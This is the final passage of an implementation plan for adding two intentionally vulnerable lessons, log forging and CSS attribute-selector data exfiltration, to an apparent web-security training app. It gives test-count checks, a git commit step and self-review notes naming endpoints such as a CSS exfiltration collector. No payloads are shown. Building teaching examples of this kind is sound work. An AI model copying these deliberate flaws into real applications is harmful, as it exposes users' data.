Expected: `543 passed` (534 + Task 1's 4 new tests + Task 2's 5 new tests = 543 -- **note:** recompute this exactly from Steps 7/8/10's actual test counts in Tasks 1 and 2 once they've landed; do not trust this plan's arithmetic blindly if the actual new-test count differs).

- [ ] **Step 7: Commit**

```bash
git add tests/test_all_examples_have_hints.py tests/test_hints.py README.md
git commit -m "test(nav): update total/max-score assertions and README for 2 new examples"
```

---

## Self-Review Notes (for the plan author, not an execution step)

**Spec coverage:** both examples from the spec (Log Injection/Forging in A09, CSS Attribute-Selector Data Exfiltration in A03) are fully covered by Tasks 1 and 2 respectively, including the spec's exact route names, constants, session keys, and testing approach (assert-unescaped-rendering rather than real-browser execution).

**Placeholder scan:** no TBD/TODO; every step has literal, complete code.

**Type/naming consistency:** `ACCOUNT_RECOVERY_PIN`, `CSS_EXFIL_SESSION_KEY`, `DISPLAY_NAME_SESSION_KEY` are each defined once (Task 1 Step 4 / Task 2 Step 4) and referenced identically everywhere else they appear (templates, tests). Endpoint names (`a09_logging_monitoring_failures.update_display_name`, `a03_injection.theme_preview`, `a03_injection.css_exfil_demo`, `a03_injection.css_exfil_collector`) match between route decorators, `ExampleNav.endpoint`, and every `url_for()` call across both tasks' templates.

**Task 3's assertions:** the 86→88 and 1780→1830 changes are arithmetically exact (Task 1 adds 1 Medium example = +20 points; Task 2 adds 1 Hard example = +30 points; 1780+20+30=1830). Task 3 Step 1 has the implementer verify the actual total before touching any assertion, rather than trusting this arithmetic blindly — matching this plan's own Global Constraints spirit of never trusting stale numbers across sequential work.
